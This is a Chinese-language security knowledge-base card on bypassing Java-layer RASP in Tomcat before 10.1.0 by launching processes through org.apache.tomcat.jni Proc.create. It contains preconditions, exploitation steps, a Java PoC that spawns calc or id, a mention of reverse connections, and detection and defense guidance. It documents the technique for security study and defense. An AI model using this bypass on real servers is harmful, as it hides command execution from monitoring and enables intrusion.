---
id: web-java-rce-tomcat-jni-proc-create-native-exec
title: Tomcat Native APR Proc.create 执行命令：经 org.apache.tomcat.jni 绕过 Java Process 层 RASP（Tomcat < 10.1.0）
type: scenario
domain: web
path: web/java/rce
technique: tomcat-jni-proc-create-native-exec
tags:
- java
- tomcat
- jni
- apr
- native
- rce
- rasp
- bypass
- command-execution
cve: []
severity: high
confidence: medium
status: verified
affected_versions: Apache Tomcat < 10.1.0
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V482
  verified_at: '2026-11-10T20:52:08+08:00'
  notes: 已对照原文与30张幻灯片逐张核对：slide24 明确 tomcat < 10.1.0 与 org.apache.tomcat.jni.Proc#create（@Deprecated，签名 long proc,String progname,String[] args,String[] env,long attr,long pool），slide23 利用代码 Library.initialize(null)→Pool.create(0)→Proc.alloc(pool)→Proc.create(proc, cmd.exe, {cmd.exe,/c,calc}, {}, Procattr.create(pool), pool) 与卡内 PoC 一致；APR native 绕过 Java Process 层 hook、依赖 tomcat-native、需 Java 代码执行前置均与幻灯片语义一致。affected_versions 按幻灯片明确标记 Apache Tomcat < 10.1.0 保留（作者已设置）；卡内'10.1.0 起移除/不再提供'为对版本标记的机制解释，属合理推断。dedup top 候选均 related/new（与 ProcessImpl/FFM/自定义JNI 卡不同入口），非重复。未验证点：未在装有 tomcat-native 的 Tomcat 环境实测 Proc.create；slide 未展示执行结果截图；Procattr/Pool 参数与内存池用法未验证（卡内 confidence=medium 合理）。frontmatter 无 sources/source_url。
url: /docs/web/java/rce/web-java-rce-tomcat-jni-proc-create-native-exec/
draft: false
kb_aliases:
- Tomcat native 命令执行
- org.apache.tomcat.jni.Proc.create
- APR 创建进程绕过 RASP
- tomcat-native 绕过命令执行 hook
- Proc.create calc
---

## 一句话结论

Tomcat < 10.1.0 的 `org.apache.tomcat.jni`（Tomcat Native/APR 的 Java 绑定）提供已废弃的 native 方法 `Proc.create`；攻击者拿到 Java 代码执行后，用 `Library.initialize` → `Pool.create` → `Proc.alloc` → `Proc.create` 直接经 APR 的 native 代码创建进程执行命令，完全绕过 `Runtime.exec`/`ProcessBuilder`/`ProcessImpl` 等 Java 层 RASP hook。

## 原理

- **JNI 绑定的进程 API**：`org.apache.tomcat.jni` 是 Tomcat Native（基于 Apache Portable Runtime）的 JNI 封装。`Proc.create(long proc, String program, String[] args, String[] env, long attr, long pool)` 是 `@Deprecated` 的 native 方法，最终调用 APR 的 `apr_proc_create`：Windows 走 `CreateProcessW`，Unix 走 fork/exec。
- **绕过 Java 层 hook**：进程创建发生在 APR 的 native 代码里，Java 侧的 `Runtime.exec`、`ProcessBuilder.start`、`ProcessImpl.<init>`、`UNIXProcess.forkAndExec` 都不会出现在调用栈中；只 hook 这些 Java API 的 RASP 无法感知，命令执行对 Java 层不可见。
- **调用前置**：`Library.initialize(null)` 初始化 APR；`Pool.create(0)` 创建内存池；`Proc.alloc(pool)` 分配 proc 结构；`Procattr.create(pool)` 创建进程属性；最后 `Proc.create(proc, program, args, env, attr, pool)`。
- **版本与依赖**：该 jni 包在 Tomcat < 10.1.0 中可用（10.1.0 起移除/不再提供），且要求目标安装并成功加载 tomcat-native（libtcnative）；否则 `Library.initialize` 会失败。
- **为什么能起进程**：APR 的 `apr_proc_create` 就是底层进程创建封装，等价于直接调用 OS 的 `CreateProcess`/`fork+exec`；示例在 Windows 上执行 `cmd.exe /c calc`。

## 触发条件

- 目标为 Tomcat < 10.1.0，且 Tomcat Native/APR 库可用（`org.apache.tomcat.jni.Library.initialize` 能成功调用）。
- 已获得任意 Java 代码执行能力（JSP、反序列化、表达式注入、内存马）。
- RASP 只覆盖 Java Process API，未监控 `org.apache.tomcat.jni` / APR native 层。
- 运行账号有创建子进程的 OS 权限。

## 利用步骤

1. 确认 Tomcat 版本 < 10.1.0，且 classpath 中存在 `org.apache.tomcat.jni`、系统已加载 tomcat-native。
2. 调用 `Library.initialize(null)` 初始化 APR。
3. `long pool = Pool.create(0); long proc = Proc.alloc(pool);`
4. 调用 `Proc.create(proc, program, args, env, Procattr.create(pool), pool);`
5. Windows 示例：`program = "C:\\Windows\\System32\\cmd.exe"`，`args = new String[]{"cmd.exe", "/c", "calc"}`；Linux 示例：`program = "/bin/sh"`，`args = new String[]{"sh", "-c", "id"}`。
6. 需要回显时改用 APR 的管道/文件重定向，或让命令写文件、反连；`Proc.create` 本身不返回输出流。

## PoC

```java
import org.apache.tomcat.jni.*;

public class TomcatNativeExec {
    public static void main(String[] args) {
        Library.initialize(null);
        long pool = Pool.create(0);
        long proc = Proc.alloc(pool);
        Proc.create(proc,
            "C:\\Windows\\System32\\cmd.exe",
            new String[]{"cmd.exe", "/c", "calc"},
            new String[]{},
            Procattr.create(pool),
            pool);
    }
}
```

## 变体与关联

- **其他 jni 能力**：`org.apache.tomcat.jni` 还封装 Socket/Pool/File 等 APR 能力，同样可绕过 Java 层 hook 做网络与文件操作；但需按类/签名逐个确认。
- **版本变体**：Tomcat >= 10.1.0 不再提供该 jni 包；可改走 Java FFM、反射 native 或其他原生库路径。
- 关联：[[web-java-rce-unsafe-allocateinstance-unixprocess-forkandexec]]（Unsafe + forkAndExec）、[[web-java-rce-ffm-native-system-rasp-bypass]]（FFM 直调 libc）、[[web-java-rce-custom-jni-native-popen-exec]]（自定义 JNI 方法）。
- 边界：未安装/无法加载 tomcat-native、Tomcat >= 10.1.0、RASP 覆盖 jni 包或 OS 层 fork/exec 监控时失效；依赖 `Procattr`/`Pool` 生命周期，参数或内存池使用错误会导致 native 崩溃。

## 检测与防御

- **检测**：业务代码通常不会直接调用 `org.apache.tomcat.jni.Library.initialize`/`Proc.create`，JVM 中出现这些调用即高可疑；APR 创建的进程没有 ProcessBuilder/ProcessImpl 调用栈与业务日志；监控 libtcnative 加载与 APR pool 异常分配。
- **防御**：RASP 将 hook 下沉到 `org.apache.tomcat.jni.Proc.create` 等 JNI 方法或 OS 层 `fork`/`execve`；不需要时卸载/禁用 tomcat-native；升级到 Tomcat >= 10.1.0；用 seccomp/AppArmor/EDR 限制应用进程创建子进程。
